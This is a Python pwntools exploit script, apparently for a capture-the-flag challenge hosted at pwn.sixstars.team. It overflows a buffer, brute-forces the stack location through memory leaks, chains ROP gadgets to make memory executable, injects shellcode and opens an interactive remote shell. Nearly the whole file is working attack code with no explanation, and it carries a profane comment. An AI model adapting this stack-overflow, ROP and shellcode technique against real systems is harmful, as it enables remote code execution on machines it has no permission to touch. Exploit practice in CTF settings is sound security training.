from pwn import *
context.log_level="debug"

# What a fucking stupid pwn :(

read=0x080480E1
write=0x080480F9
addesp=0x0804817C
rop=0x080480E6
bss=0x8048800
begin=0x0804811E

def fuck(r, addr):
    #r=remote("pwn.sixstars.team", 22013)
    tag='/bin/sh\x00'
    sh=tag+'a'*(0x10-len(tag)) 
    sh+=p32(write)+p32(begin)+p32(1)+p32(addr)+p32(0x800)
    r.sendafter("PRO:", sh)
    r.recvline()
    try:
        a = r.recv()
        a = a.find(tag)
        if a>=0:
            return addr + a
        else:
            return -1
    except:
        return -2

flag = 0
while(1):
    for i in range(0x1000):
        r=remote("pwn.sixstars.team", 22013)
        #r=process("./level13-pro")
        #print r.pid
        #pause()
        addr = 0xff800000+0x800*i
        real = fuck(r, addr)
        if real >= 0:
            print hex(real)
            flag = 1
            break
        else:
            r.close()
    if flag == 1:
        break

print hex(real)
#print r.pid
#pause()


stack = real + 0x40

sh='a'*0x10
sh+=p32(read)+p32(addesp)+p32(0)+p32(stack)+p32(0x1000)
            
sh2=p32(write)+p32(addesp)+p32(1)+p32(0x8048000)+p32(0x7d)
sh2+='a'*4*5
sh2+=p32(rop)+p32(addesp)+p32(0x8048000)+p32(0x1000)+p32(7)
sh2+='a'*4*5
sh2+=p32(read)+p32(bss)+p32(0)+p32(bss)+p32(0x100)

r.send(sh)
r.sendline(sh2)
r.recv()
r.sendline(asm(shellcraft.sh()))
r.interactive()

